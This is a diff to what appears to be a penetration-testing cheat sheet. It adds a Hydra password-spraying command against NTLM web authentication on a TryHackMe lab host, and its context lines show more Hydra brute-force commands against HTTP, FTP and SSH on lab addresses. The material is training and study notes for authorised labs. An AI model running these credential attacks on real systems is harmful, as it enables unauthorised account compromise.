@@ -217,6 +217,7 @@
 ### [Brute Forcing](#)
 
 - Hydra
+    - `hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'` (/ = path to the login page, A=NTLM = NTLM authentication type, F=401 = failure code)
     - `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.5.21.117 http-get /webdav/`
     - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.60.4.3 ftp`
     - `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.72.183.3 ssh`
